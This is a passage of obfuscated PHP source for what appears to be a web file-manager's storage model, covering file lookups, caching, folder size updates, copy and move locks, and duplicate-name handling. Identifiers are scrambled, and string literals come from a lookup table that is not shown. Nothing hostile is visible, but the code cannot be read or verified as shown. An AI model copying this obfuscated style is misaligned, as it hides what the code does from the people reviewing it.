$–õ»©¤[$‰íÂØÁÅ[79]]); if (!$×Î´Ñá) { return Model($‰íÂØÁÅ[548])->remove($–õ»©¤[$‰íÂØÁÅ[545]]); } $this->folderSizeReset($Ëô¨“Åª[$‰íÂØÁÅ[193]]); return !0; } public function fileSubstr($º€‡ã, $ôÂƒ‡å, $¦ù±½­ê) { $Ô¾Óëñ = $this->fileInfoGet($º€‡ã); if (!$Ô¾Óëñ) { return !1; } return IO::fileSubstr($Ô¾Óëñ[$_SERVER[ıÚ˜š²İ][87]], $ôÂƒ‡å, $¦ù±½­ê); } public function fileInfoGet($°‹öàƒ‚) { $®Ïó»û¤ =& $_SERVER[ıÚ˜š²İ]; $Õ÷Ÿ¥°ê = $this->sourceInfo($°‹öàƒ‚); if (!$Õ÷Ÿ¥°ê || $Õ÷Ÿ¥°ê[$®Ïó»û¤[487]]) { return !1; } $¥–ãóúç = $®Ïó»û¤[552] . $Õ÷Ÿ¥°ê[$®Ïó»û¤[545]]; $à¾ÄÃ§¶ = _get(self::$cacheFileInfo, $¥–ãóúç); if ($à¾ÄÃ§¶) { return $à¾ÄÃ§¶; } $ƒÏ‘Ûì“ = Model($®Ïó»û¤[548])->fileInfo($Õ÷Ÿ¥°ê[$®Ïó»û¤[545]]); if ($ƒÏ‘Ûì“) { $ƒÏ‘Ûì“[$®Ïó»û¤[32]] = $Õ÷Ÿ¥°ê[$®Ïó»û¤[32]]; } self::$cacheFileInfo[$¥–ãóúç] = $ƒÏ‘Ûì“; return $ƒÏ‘Ûì“; } private function folderChildrenNumber($íœ÷ı¸) { $õ…ºŠµË =& $_SERVER[ıÚ˜š²İ]; $ØÄ’Ú€© = $this->sourceInfo($íœ÷ı¸); $ü€ãèë = array($õ…ºŠµË[659] => array($õ…ºŠµË[619], $ØÄ’Ú€©[$õ…ºŠµË[588]] . $íœ÷ı¸ . $õ…ºŠµË[620]), $õ…ºŠµË[656] => $ØÄ’Ú€©[$õ…ºŠµË[573]], $õ…ºŠµË[506] => intval($ØÄ’Ú€©[$õ…ºŠµË[507]]), $õ…ºŠµË[653] => 1); $åØÀÂŒó = $this->where($ü€ãèë)->count(); $²Á®­®… = $this->where($ü€ãèë)->where(array($õ…ºŠµË[653] => 0))->count(); return array($õ…ºŠµË[83] => $²Á®­®…, $õ…ºŠµË[84] => $åØÀÂŒó); } public function pathInfo($ñŸÍ€¨Œ, $ÛÔïæí­ = false) { $–¼¡Ù™Ø =& $_SERVER[ıÚ˜š²İ]; $ÛÔïæí­ = !1; $ñŸÍ€¨Œ = intval($ñŸÍ€¨Œ); $Êõ±Ÿà® = $–¼¡Ù™Ø[536] . intval($ÛÔïæí­) . $–¼¡Ù™Ø[464] . $ñŸÍ€¨Œ; $¼Á—óÕ¬ = _get(self::$cachePathInfo, $Êõ±Ÿà®); if ($¼Á—óÕ¬) { return $¼Á—óÕ¬; } $ÌÅÓÌÙæ = $this->sourceInfo($ñŸÍ€¨Œ); if (!$ÌÅÓÌÙæ) { return !1; } $ÌÅÓÌÙæ = $this->_listDataApplyItem($ÌÅÓÌÙæ, $ÛÔïæí­); self::$cachePathInfo[$Êõ±Ÿà®] = $ÌÅÓÌÙæ; return $ÌÅÓÌÙæ; } public static $cachePathInfoMore = array(); public function pathInfoMore($ÆË¦Í”ï) { $³™ì†ˆ¶ =& $_SERVER[ıÚ˜š²İ]; $ı›öÜ´ = _get(self::$cachePathInfoMore, $ÆË¦Í”ï); if ($ı›öÜ´) { return $ı›öÜ´; } $²ß¬’°º = $this->pathInfo($ÆË¦Í”ï); if (!$²ß¬’°º) { return !1; } if ($²ß¬’°º[$³™ì†ˆ¶[487]] == $³™ì†ˆ¶[91]) { $²ß¬’°º[$³™ì†ˆ¶[82]] = $this->folderChildrenNumber($ÆË¦Í”ï); } self::$cachePathInfoMore[$ÆË¦Í”ï] = $²ß¬’°º; return $²ß¬’°º; } public function sourceInfo($ñ´Â®í­) { $ï·ËãÂÒ =& $_SERVER[ıÚ˜š²İ]; if (!$ñ´Â®í­) { return array(); } $ñ´Â®í­ = intval($ñ´Â®í­); $ú«Å•• = $ï·ËãÂÒ[535] . $ñ´Â®í­; $Æğ‡¢¶ = _get(self::$cacheSourceInfo, $ú«Å••); if ($Æğ‡¢¶) { return $Æğ‡¢¶; } $¿ù”–•Ê = $this->where(array($ï·ËãÂÒ[194] => $ñ´Â®í­))->find(); self::$cacheSourceInfo[$ú«Å••] = $¿ù”–•Ê; return self::$cacheSourceInfo[$ú«Å••]; } public function sourceCacheClear($¥Ø¯Êœ‹ = false) { self::cacheClear($¥Ø¯Êœ‹); } public static function cacheClear($øÚâÄ°„ = false) { $ĞäæÙ¡Ù =& $_SERVER[ıÚ˜š²İ]; if ($øÚâÄ°„ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ĞäæÙ¡Ù[535] . $øÚâÄ°„]); unset(self::$cachePathInfoMore[$øÚâÄ°„]); unset(self::$cachePathInfo[$ĞäæÙ¡Ù[2312] . $øÚâÄ°„]); unset(self::$cachePathInfo[$ĞäæÙ¡Ù[2313] . $øÚâÄ°„]); } public function metaSet($¤Äøûˆù, $È‰ÒĞò¦ = null, $¥¯Î°çä = null) { $ ‘¨´æù = parent::metaSet($¤Äøûˆù, $È‰ÒĞò¦, $¥¯Î°çä); if ($ ‘¨´æù) { $this->sourceCacheClear($¤Äøûˆù); } return $ ‘¨´æù; } public function pathInfoByPath($›ÌûÀ¤´, $ß§ˆÜ¬÷) { $ß¯²Ù½Ş =& $_SERVER[ıÚ˜š²İ]; $ÎÕşÓÃè = !$ß§ˆÜ¬÷ ? array() : explode($ß¯²Ù½Ş[8], trim($ß§ˆÜ¬÷, $ß¯²Ù½Ş[8])); $Æ»¹ŸÅë = $›ÌûÀ¤´; foreach ($ÎÕşÓÃè as $×ñËéıâ) { $÷İ²¾û³ = array($ß¯²Ù½Ş[193] => $Æ»¹ŸÅë, $ß¯²Ù½Ş[32] => $×ñËéıâ); $šøÌ–Â¼ = $this->field($ß¯²Ù½Ş[2314])->where($÷İ²¾û³)->select(); if (!$šøÌ–Â¼) { return !1; } $šøÌ–Â¼ = array_sort_by($šøÌ–Â¼, $ß¯²Ù½Ş[507]); $Æ»¹ŸÅë = $šøÌ–Â¼[0][$ß¯²Ù½Ş[194]]; } $¯•æ² = $this->sourceInfo($Æ»¹ŸÅë); $this->pathInfoFilter($¯•æ²); return $¯•æ²; } protected function updateModifyTime($¡³«¥üÍ) { $¥é…áÉê =& $_SERVER[ıÚ˜š²İ]; $è…ğĞËà = defined($¥é…áÉê[2222]) ? USER_ID : 0; if (!$¡³«¥üÍ) { return; } if (!is_array($¡³«¥üÍ)) { $¡³«¥üÍ = array($¡³«¥üÍ); } foreach ($¡³«¥üÍ as $êåäûÃù => $‡¾å¡°) { $¡³«¥üÍ[$êåäûÃù] = intval($‡¾å¡°); $this->sourceCacheClear($‡¾å¡°); } $ìÕÍ’Ç = array($¥é…áÉê[194] => array($¥é…áÉê[7], $¡³«¥üÍ)); $²ŞŸ­” = array($¥é…áÉê[658] => $è…ğĞËà, $¥é…áÉê[500] => time()); $this->where($ìÕÍ’Ç)->save($²ŞŸ­”); } public function folderSizeReset($öíµüÈé, $ ßëõèƒ = false) { $•á¿Á™µ =& $_SERVER[ıÚ˜š²İ]; if ($this->statusIgnoreResetSpace) { return; } $»è¯’¼ = $this->sourceInfo($öíµüÈé); $¨Íâ–â‡ = $•á¿Á™µ[2315] . $öíµüÈé; CacheLock::lock($¨Íâ–â‡, 20); if ($ ßëõèƒ === !1) { $this->sourceCacheClear($öíµüÈé); $»è¯’¼ = $this->sourceInfo($öíµüÈé); $ÛÄÓİ½” = array($•á¿Á™µ[479] => $öíµüÈé, $•á¿Á™µ[506] => 0); $ÇäıÇ±À = $this->where($ÛÄÓİ½”)->sum($•á¿Á™µ[79]); $ ßëõèƒ = intval($ÇäıÇ±À) - intval($»è¯’¼[$•á¿Á™µ[79]]); } if ($ ßëõèƒ == 0) { return CacheLock::unlock($¨Íâ–â‡); } $ˆåŞ¸ãÓ = $this->parentLevelArray($»è¯’¼[$•á¿Á™µ[588]]); if (!$ˆåŞ¸ãÓ) { $ˆåŞ¸ãÓ = array(); } $ˆåŞ¸ãÓ[] = $»è¯’¼[$•á¿Á™µ[194]]; $ÛÄÓİ½” = array($•á¿Á™µ[194] => array($•á¿Á™µ[494], $ˆåŞ¸ãÓ)); if ($ ßëõèƒ < 0) { $ÛÄÓİ½”[$•á¿Á™µ[79]] = array($•á¿Á™µ[1104], abs($ ßëõèƒ)); } $this->where($ÛÄÓİ½”)->setAdd($•á¿Á™µ[79], $ ßëõèƒ); CacheLock::unlock($¨Íâ–â‡); $»øÊñŸç = $•á¿Á™µ[2316] . $»è¯’¼[$•á¿Á™µ[191]] . $•á¿Á™µ[4] . $»è¯’¼[$•á¿Á™µ[573]]; $ËÇüöÚ¨ = array($»è¯’¼[$•á¿Á™µ[191]], $»è¯’¼[$•á¿Á™µ[573]]); TaskRun::timeLimitCall($»øÊñŸç, $•á¿Á™µ[2317], $ËÇüöÚ¨, 1.5); } public function folderSizeResetChildren($ö˜º…ì) { $¥–õ‘¥Œ =& $_SERVER[ıÚ˜š²İ]; $this->sourceCacheClear($ö˜º…ì); $Å†ñÛ³ = $this->sourceInfo($ö˜º…ì); $è°À¸İ = array($¥–õ‘¥Œ[653] => 1, $¥–õ‘¥Œ[656] => $Å†ñÛ³[$¥–õ‘¥Œ[573]], $¥–õ‘¥Œ[659] => array($¥–õ‘¥Œ[619], $Å†ñÛ³[$¥–õ‘¥Œ[588]] . $ö˜º…ì . $¥–õ‘¥Œ[620])); $ï‡Ê¾Ãß = $¥–õ‘¥Œ[2318]; $Üó®¯ü = $this->field($ï‡Ê¾Ãß)->where($è°À¸İ)->select(); $è°À¸İ[$¥–õ‘¥Œ[487]] = 0; $Å¸ƒù¨¶ = $this->field($ï‡Ê¾Ãß)->where($è°À¸İ)->select(); if (!$Å¸ƒù¨¶) { return; } $Üó®¯ü[] = $Å†ñÛ³; $Üó®¯ü = array_to_keyvalue($Üó®¯ü, $¥–õ‘¥Œ[194]); foreach ($Üó®¯ü as $ş…”Şî => $„¨Í¢Œ¡) { $Üó®¯ü[$ş…”Şî][$¥–õ‘¥Œ[2319]] = $Üó®¯ü[$ş…”Şî][$¥–õ‘¥Œ[79]]; $Üó®¯ü[$ş…”Şî][$¥–õ‘¥Œ[79]] = 0; } foreach ($Å¸ƒù¨¶ as $„¨Í¢Œ¡) { $ÀË÷£²Ğ = $„¨Í¢Œ¡[$¥–õ‘¥Œ[193]] . $¥–õ‘¥Œ[12]; if (!isset($Üó®¯ü[$ÀË÷£²Ğ])) { continue; } if ($„¨Í¢Œ¡[$¥–õ‘¥Œ[507]] == $Üó®¯ü[$ÀË÷£²Ğ][$¥–õ‘¥Œ[507]]) { $Üó®¯ü[$ÀË÷£²Ğ][$¥–õ‘¥Œ[79]] += $„¨Í¢Œ¡[$¥–õ‘¥Œ[79]]; } } foreach ($Üó®¯ü as $„¨Í¢Œ¡) { $õ­îêØÙ = $this->parentLevelArray($„¨Í¢Œ¡[$¥–õ‘¥Œ[588]]); foreach ($õ­îêØÙ as $ÀË÷£²Ğ) { $ÀË÷£²Ğ = $ÀË÷£²Ğ . $¥–õ‘¥Œ[12]; if (!isset($Üó®¯ü[$ÀË÷£²Ğ])) { continue; } if ($„¨Í¢Œ¡[$¥–õ‘¥Œ[507]] == $Üó®¯ü[$ÀË÷£²Ğ][$¥–õ‘¥Œ[507]]) { $Üó®¯ü[$ÀË÷£²Ğ][$¥–õ‘¥Œ[79]] += $„¨Í¢Œ¡[$¥–õ‘¥Œ[79]]; } } } $¶ÍÕœ­ = array(); foreach ($Üó®¯ü as $„¨Í¢Œ¡) { if ($„¨Í¢Œ¡[$¥–õ‘¥Œ[79]] == $„¨Í¢Œ¡[$¥–õ‘¥Œ[2319]]) { continue; } $¶ÍÕœ­[] = array($¥–õ‘¥Œ[194], $„¨Í¢Œ¡[$¥–õ‘¥Œ[194]], $¥–õ‘¥Œ[79], $„¨Í¢Œ¡[$¥–õ‘¥Œ[79]]); } $this->saveAll($¶ÍÕœ­); } public function userSpaceReset($ùË§†’ = false) { $’˜Ó–Îå =& $_SERVER[ıÚ˜š²İ]; $ÛäÖñ÷• = $this->where(array($’˜Ó–Îå[191] => self::TYPE_USER, $’˜Ó–Îå[573] => $ùË§†’, $’˜Ó–Îå[487] => 0))->sum($’˜Ó–Îå[79]); $ÛäÖñ÷• = !$ÛäÖñ÷• || $ÛäÖñ÷• <= 0 ? 0 : $ÛäÖñ÷•; Model($’˜Ó–Îå[581])->userEdit($ùË§†’, array($’˜Ó–Îå[1982] => $ÛäÖñ÷•)); } public function targetSpaceUpdate($¢ÈÎ¦‡ì, $Ïã¦ßãã) { $Ğ¤õ¾¢… =& $_SERVER[ıÚ˜š²İ]; if (!$Ïã¦ßãã) { return; } if (!in_array($¢ÈÎ¦‡ì, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $åµôú¥“ = $this->targetSpaceSize($¢ÈÎ¦‡ì, $Ïã¦ßãã); if ($¢ÈÎ¦‡ì == self::TYPE_USER) { Model($Ğ¤õ¾¢…[581])->userEdit($Ïã¦ßãã, array($Ğ¤õ¾¢…[1982] => $åµôú¥“)); } else { if ($¢ÈÎ¦‡ì == self::TYPE_GROUP) { Model($Ğ¤õ¾¢…[589])->groupEdit($Ïã¦ßãã, array($Ğ¤õ¾¢…[1982] => $åµôú¥“)); } } } public function targetSpaceSize($ óÑ–Ñ, $õå›úô¬) { $Ï²å¶­Ø =& $_SERVER[ıÚ˜š²İ]; $°­¬ ¥ = 0; $Ô‡¢êÁ‹ = $this->targetSourceRoot($ óÑ–Ñ, $õå›úô¬, !0); foreach ($Ô‡¢êÁ‹ as $˜ÉÔÏà†) { if (!$˜ÉÔÏà†) { continue; } $°­¬ ¥ += floatval($˜ÉÔÏà†[$Ï²å¶­Ø[79]]); $¼š¥å“½ = array($Ï²å¶­Ø[659] => array($Ï²å¶­Ø[619], $Ï²å¶­Ø[597] . $˜ÉÔÏà†[$Ï²å¶­Ø[194]] . $Ï²å¶­Ø[620])); $÷âË‘š¯ = Model($Ï²å¶­Ø[505])->field($Ï²å¶­Ø[493])->where($¼š¥å“½)->select(); $÷âË‘š¯ = array_to_keyvalue($÷âË‘š¯, $Ï²å¶­Ø[12], $Ï²å¶­Ø[194]); $÷âË‘š¯ = array_unique(array_filter($÷âË‘š¯)); if ($÷âË‘š¯) { $¼š¥å“½ = array($Ï²å¶­Ø[493] => array($Ï²å¶­Ø[494], $÷âË‘š¯)); $°­¬ ¥ += floatval($this->where($¼š¥å“½)->sum($Ï²å¶­Ø[79])); } } $°­¬ ¥ = !$°­¬ ¥ || $°­¬ ¥ <= 0 ? 0 : $°­¬ ¥; return $°­¬ ¥; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ØÕÍğ¦ı) { return $this->fileTypeProfile($ØÕÍğ¦ı, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ñúâ²õ±) { return $this->fileTypeProfile($ñúâ²õ±, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Á€‘×ù, $“ê²ğÔå) { $Û®…ô”ù =& $_SERVER[ıÚ˜š²İ]; $˜ùì¬åÕ = $Û®…ô”ù[2320] . $Á€‘×ù . $Û®…ô”ù[11] . $“ê²ğÔå; $ó¿±£ìÇ = Cache::get($˜ùì¬åÕ); if ($ó¿±£ìÇ) { return $ó¿±£ìÇ; } $Û³¢Œ´¡ = array($Û®…ô”ù[653] => 0); if ($Á€‘×ù != !1) { $Û³¢Œ´¡[$Û®…ô”ù[573]] = $Á€‘×ù; $Û³¢Œ´¡[$Û®…ô”ù[191]] = $“ê²ğÔå; } $¯—ƒØß = array(); $¯—ƒØß[$Û®…ô”ù[2321]] = array($Û®…ô”ù[2322] => LNG($Û®…ô”ù[2321]), $Û®…ô”ù[2323] => $this->where($Û³¢Œ´¡)->count(), $Û®…ô”ù[624] => $this->where($Û³¢Œ´¡)->sum($Û®…ô”ù[79])); $àÍÅûã = KodIO::fileTypeList(); foreach ($àÍÅûã as $Â—ñîñÏ => $¨¡Ç²Ÿ) { $Û³¢Œ´¡[$Û®…ô”ù[488]] = $this->fileTypeWhere($Â—ñîñÏ); $¯—ƒØß[$Â—ñîñÏ] = array($Û®…ô”ù[2322] => $¨¡Ç²Ÿ[$Û®…ô”ù[32]], $Û®…ô”ù[2323] => $this->where($Û³¢Œ´¡)->count(), $Û®…ô”ù[624] => $this->where($Û³¢Œ´¡)->sum($Û®…ô”ù[79])); } Cache::set($˜ùì¬åÕ, $¯—ƒØß, 1200); return $¯—ƒØß; } public function fileNameExist($ìÒŞÏÓµ, $Ğø©Î‘È) { $Ñöò·ïã =& $_SERVER[ıÚ˜š²İ]; $‰•Ï ­ = $this->field($Ñöò·ïã[2324])->where(array($Ñöò·ïã[193] => $ìÒŞÏÓµ, $Ñöò·ïã[32] => $Ğø©Î‘È, $Ñöò·ïã[507] => 0))->find(); return is_array($‰•Ï ­) ? $‰•Ï ­[$Ñöò·ïã[194]] : !1; } public function childList($…ßò§Ù) { $®¦ò£–¥ =& $_SERVER[ıÚ˜š²İ]; $€îÈ Õ = $®¦ò£–¥[2297] . $…ßò§Ù; if (isset(self::$cacheChildList[$€îÈ Õ])) { return self::$cacheChildList[$€îÈ Õ]; } $ÏîÅüâå = array($®¦ò£–¥[193] => intval($…ßò§Ù), $®¦ò£–¥[507] => 0); $ÎŠïÃèİ = $this->where($ÏîÅüâå)->select(); $ÎŠïÃèİ = $ÎŠïÃèİ ? $ÎŠïÃèİ : array(); self::$cacheChildList[$€îÈ Õ] = $ÎŠïÃèİ; foreach ($ÎŠïÃèİ as $öÍ§Ş’) { $€îÈ Õ = $®¦ò£–¥[535] . $öÍ§Ş’[$®¦ò£–¥[194]]; self::$cacheSourceInfo[$€îÈ Õ] = $öÍ§Ş’; } return $ÎŠïÃèİ; } public function fileNameAuto($ê€•â¬È, $¥øà¸¶ª, $œ¾İÍ· = REPEAT_RENAME, $ëúÛ¢½‹ = false) { $Ù‚ÌøŒ° =& $_SERVER[ıÚ˜š²İ]; $¡€«¹¼¡ = get_path_ext($¥øà¸¶ª); $â‘Ù£¥¨ = $¡€«¹¼¡ ? get_path_ext_name($¥øà¸¶ª) . $Ù‚ÌøŒ°[2325] . $¡€«¹¼¡ : $¥øà¸¶ª . $Ù‚ÌøŒ°[462]; $ì¾şÁÇ = array($Ù‚ÌøŒ°[193] => $ê€•â¬È, $Ù‚ÌøŒ°[507] => 0, $Ù‚ÌøŒ°[32] => array($Ù‚ÌøŒ°[461], $â‘Ù£¥¨)); $©Ï€‚… = $this->field($Ù‚ÌøŒ°[32])->where($ì¾şÁÇ)->select(); $Ï‰ãÙ‡× = array_to_keyvalue($©Ï€‚…, $Ù‚ÌøŒ°[12], $Ù‚ÌøŒ°[32]); return $this->fileNameAutoGet($Ï‰ãÙ‡×, $¥øà¸¶ª, $œ¾İÍ·, $ëúÛ¢½‹); } public function fileNameAutoGet($ÌæÉ¶™Õ, $Óª¬ÅÉ¬, $³à±µò, $Ûœ§‹Í®) { $•¬èë–Ö =& $_SERVER[ıÚ˜š²İ]; if ($³à±µò == REPEAT_REPLACE || !$ÌæÉ¶™Õ || !in_array_not_case($Óª¬ÅÉ¬, $ÌæÉ¶™Õ) || $Ûœ§‹Í® && $³à±µò != REPEAT_RENAME_FOLDER) { return $Óª¬ÅÉ¬; } if ($³à±µò == REPEAT_SKIP) { return !1; } $”ÖéÊÔ€ = $•¬èë–Ö[10] . get_path_ext($Óª¬ÅÉ¬); $”ÖéÊÔ€ = $”ÖéÊÔ€ == $•¬èë–Ö[10] || $Ûœ§‹Í® ? $•¬èë–Ö[12] : $”ÖéÊÔ€; for ($ƒ°¹± = 1; $ƒ°¹± <= count($ÌæÉ¶™Õ) + 1; $ƒ°¹±++) { $ ı«ŒÄ = substr($Óª¬ÅÉ¬, 0, strlen($Óª¬ÅÉ¬) - strlen($”ÖéÊÔ€)); $ôÉÖ¶†Í = $ ı«ŒÄ . "\x28{$ƒ°¹±}\x29{$”ÖéÊÔ€}"; if (!in_array_not_case($ôÉÖ¶†Í, $ÌæÉ¶™Õ)) { return $ôÉÖ¶†Í; } } } } goto B’’¨É¡“â; aá­¹…±¾ƒ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($’ÚÊÕ´™) { $†şŸª‚š =& $_SERVER[ıÚ˜š²İ]; if (!$this->allowLock()) { return; } $this->_lockCheck($†şŸª‚š[625], $’ÚÊÕ´™); $¸¸è…ô = 1; $this->_lockEvent($’ÚÊÕ´™, array($†şŸª‚š[626], $†şŸª‚š[627]), $¸¸è…ô); $this->_lockParent($’ÚÊÕ´™, array($†şŸª‚š[627]), $¸¸è…ô); $this->_lockEvent($’ÚÊÕ´™, array($†şŸª‚š[628], $†şŸª‚š[629]), $¸¸è…ô); $this->_lockCheckEnd($†şŸª‚š[625], $’ÚÊÕ´™); } public function lockCopyEnd($‹³Úò›£) { $ÀŒŒŠ›ú =& $_SERVER[ıÚ˜š²İ]; if (!$this->allowLock()) { return; } $º‹øÅùı = 0; $this->_lockEvent($‹³Úò›£, array($ÀŒŒŠ›ú[626], $ÀŒŒŠ›ú[627]), $º‹øÅùı); $this->_lockParent($‹³Úò›£, array($ÀŒŒŠ›ú[627]), $º‹øÅùı); $this->_lockEvent($‹³Úò›£, array($ÀŒŒŠ›ú[628], $ÀŒŒŠ›ú[629]), $º‹øÅùı); } public function lockWriteStart($»Ğ˜¾Ì†, $¿ã”³´‰ = '') { $´›ñ©Ğ² =& $_SERVER[ıÚ˜š²İ]; if (!$this->allowLock()) { return; } $this->_lockCheck($´›ñ©Ğ²[626], $»Ğ˜¾Ì†); $Ä’Ë¬Áâ = 1; $this->_lockKey($´›ñ©Ğ²[630] . $»Ğ˜¾Ì† . $´›ñ©Ğ²[10] . $¿ã”³´‰, $Ä’Ë¬Áâ); $this->_lockEvent($»Ğ˜¾Ì†, array($´›ñ©Ğ²[625], $´›ñ©Ğ²[627]), $Ä’Ë¬Áâ); $this->_lockParent($»Ğ˜¾Ì†, array($´›ñ©Ğ²[625], $´›ñ©Ğ²[627]), $Ä’Ë¬Áâ); $this->_lockCheckEnd($´›ñ©Ğ²[626], $»Ğ˜¾Ì†); } public function lockWriteEnd($¿€ƒ°–ì, $Ş¼°…ˆÒ = '') { $ôâŒÅĞ‘ =& $_SERVER[ıÚ˜š²İ]; if (!$this->allowLock()) { return; } $¡¼Ôâ¹º = 0; $this->_lockKey($ôâŒÅĞ‘[630] . $¿€ƒ°–ì . $ôâŒÅĞ‘[10] . $Ş¼°…ˆÒ, $¡¼Ôâ¹º); $this->_lockEvent($¿€ƒ°–ì, array($ôâŒÅĞ‘[625], $ôâŒÅĞ‘[627]), $¡¼Ôâ¹º); $this->_lockParent($¿€ƒ°–ì, array($ôâŒÅĞ‘[625], $ôâŒÅĞ‘[627]), $¡¼Ôâ¹º); } public function lockMoveStart($ï‡»“ÖŠ) { $¦õ‹Â†¬ =& $_SERVER[ıÚ˜š²İ]; if (!$this->allowLock()) { return; } $this->_lockCheck($¦õ‹Â†¬[627], $ï‡»“ÖŠ); $ÌÉ¤ó»• = 1; $this->_lockKey($¦õ‹Â†¬[631] . $ï‡»“ÖŠ, $ÌÉ¤ó»•); $this->_lockEvent($ï‡»“ÖŠ, array($¦õ‹Â†¬[625], $¦õ‹Â†¬[626]), $ÌÉ¤ó»•); $this->_lockParent($ï‡»“ÖŠ, array($¦õ‹Â†¬[625], $¦õ‹Â†¬[627]), $ÌÉ¤ó»•); $this->_lockEvent($ï‡»“ÖŠ, array($¦õ‹Â†¬[632], $¦õ‹Â†¬[628], $¦õ‹Â†¬[629]), $ÌÉ¤ó»•); $this->_lockCheckEnd($¦õ‹Â†¬[627], $ï‡»“ÖŠ); } public function lockMoveEnd($‡öß»ıÚ) { $ß²´ÂƒÎ =& $_SERVER[ıÚ˜š²İ]; if (!$this->allowLock()) { return; } $Š´™¹š = 0; $this->_lockKey($ß²´ÂƒÎ[631] . $‡öß»ıÚ, $Š´™¹š); $this->_lockEvent($‡öß»ıÚ, array($ß²´ÂƒÎ[625], $ß²´ÂƒÎ[626]), $Š´™¹š); $this->_lockParent($‡öß»ıÚ, array($ß²´ÂƒÎ[625], $ß²´ÂƒÎ[627]), $Š´™¹š); $this->_lockEvent($‡öß»ıÚ, array($ß²´ÂƒÎ[632], $ß²´ÂƒÎ[628], $ß²´ÂƒÎ[629]), $Š´™¹š); } private function _lockCheck($¤üˆœå, $ŠàºÔŒ¡) { $ô±ä¤®… =& $_SERVER[ıÚ˜š²İ]; $ÍîÄéÎ = $this->sourceInfo($ŠàºÔŒ¡); $Â£—­Õ× = $¤üˆœå . $ô±ä¤®…[10] . $ŠàºÔŒ¡; $this->_lockTimeStart[$Â£—­Õ×] = timeFloat(); if (!is_array($ÍîÄéÎ)) { return; } $ù¯ÃÑ·Ê = LNG($ô±ä¤®…[633]); CacheLock::setErrorMsg($ô±ä¤®…[176] . htmlspecialchars($ÍîÄéÎ[$ô±ä¤®…[32]]) . $ô±ä¤®…[178] . $ù¯ÃÑ·Ê); $this->_lockKey($Â£—­Õ×, 1); $this->_lockKey($Â£—­Õ×, 0); $® îèË– = array_reverse($this->parentLevelArray($ÍîÄéÎ[$ô±ä¤®…[588]])); foreach ($® îèË– as $Å²®ºŸİ) { $Â£—­Õ× = $¤üˆœå . $ô±ä¤®…[634] . $Å²®ºŸİ; if (CacheLock::lockGet($ô±ä¤®…[635] . $Â£—­Õ×)) { $ÍîÄéÎ = $this->sourceInfo($Å²®ºŸİ); CacheLock::setErrorMsg($ô±ä¤®…[176] . htmlspecialchars($ÍîÄéÎ[$ô±ä¤®…[32]]) . $ô±ä¤®…[178] . $ù¯ÃÑ·Ê); $this->_lockKey($Â£—­Õ×, 1); $this->_lockKey($Â£—­Õ×, 0); } } } private function _lockCheckEnd($œĞ¥ÀÁ°, $¢ƒÁÄŸ) { $ÆÂ±‚™ß =& $_SERVER[ıÚ˜š²İ]; $Å‘Ù¬‘œ = $œĞ¥ÀÁ° . $ÆÂ±‚™ß[10] . $¢ƒÁÄŸ; CacheLock::setErrorMsg($ÆÂ±‚™ß[456]); if (!isset($this->_lockTimeStart[$Å‘Ù¬‘œ])) { return; } $—şğÉ±Ö = timeFloat() - $this->_lockTimeStart[$Å‘Ù¬‘œ]; unset($this->_lockTimeStart[$Å‘Ù¬‘œ]); if ($—şğÉ±Ö > 0.5) { unset(self::$cacheSourceInfo[$ÆÂ±‚™ß[535] . $¢ƒÁÄŸ]); } $ÑåÂ–Å = $this->sourceInfo($¢ƒÁÄŸ); if (!$ÑåÂ–Å) { show_json(LNG($ÆÂ±‚™ß[108]), !1); } } private function _lockParent($À’¹Äéä, $şèÙ÷·À, $«€‚ß­æ) { if (!$this->autoLockSet) { return; } $›ßåš = $this->sourceInfo($À’¹Äéä); if (!is_array($›ßåš)) { return; } $êÍÜ´­á = array_reverse($this->parentLevelArray($›ßåš[$_SERVER[ıÚ˜š²İ][588]])); foreach ($êÍÜ´­á as $ÒĞ†ÕÌ™) { $this->_lockEvent($ÒĞ†ÕÌ™, $şèÙ÷·À, $«€‚ß­æ); } } private function _lockEvent($Ü¹¨©¿©, $‡ºƒÇ›, $¿…˜ÔÌÏ) { $Â–ÓË´ì =& $_SERVER[ıÚ˜š²İ]; if (!$this->autoLockSet) { return; } foreach ($‡ºƒÇ› as $‚½…°üã) { $ïÉ²ÙÅ = $‚½…°üã . $Â–ÓË´ì[10] . $Ü¹¨©¿©; if ($¿…˜ÔÌÏ && CacheLock::lockGet($Â–ÓË´ì[635] . $ïÉ²ÙÅ)) { continue; } $this->_lockKey($ïÉ²ÙÅ, $¿…˜ÔÌÏ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ûÏ¨°¹á, $şÙñ„ö = 1) { $Ïœ¨˜‡ = $_SERVER[ıÚ˜š²İ][635] . md5($ûÏ¨°¹á); if ($şÙñ„ö) { if (isset(self::$_lockItemArr[$Ïœ¨˜‡])) { return; } self::$_lockItemArr[$Ïœ¨˜‡] = 1; CacheLock::lock($Ïœ¨˜‡, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Ïœ¨˜‡])) { return; } unset(self::$_lockItemArr[$Ïœ¨˜‡]); CacheLock::unlock($Ïœ¨˜‡); } } public function isParentOf($‡°©´íö, $ÀÄ—¾¿ê) { $ÅØŒûö¿ =& $_SERVER[ıÚ˜š²İ]; $ÂúÃ¼öù = $this->sourceInfo($‡°©´íö); $éÉËË²˜ = $this->sourceInfo($ÀÄ—¾¿ê); $ÒŸõÆğø = $ÂúÃ¼öù[$ÅØŒûö¿[588]] . $ÂúÃ¼öù[$ÅØŒûö¿[194]] . $ÅØŒûö¿[50]; $¦Ôğöàà = $éÉËË²˜[$ÅØŒûö¿[588]] . $éÉËË²˜[$ÅØŒûö¿[194]] . $ÅØŒûö¿[50]; $ÒãÒèº = strpos($¦Ôğöàà, $ÒŸõÆğø) === 0; return $ÒãÒèº; } private $targetIsDelete = 0; public function copy($üº™Î«, $Òğ¹ÚÏ, $¾ñÑì¶Ì = REPEAT_REPLACE, $êìœ¤ú¼ = '') { $ÃÕè½ªñ =& $_SERVER[ıÚ˜š²İ]; $ÄÜÅÕ±Š = 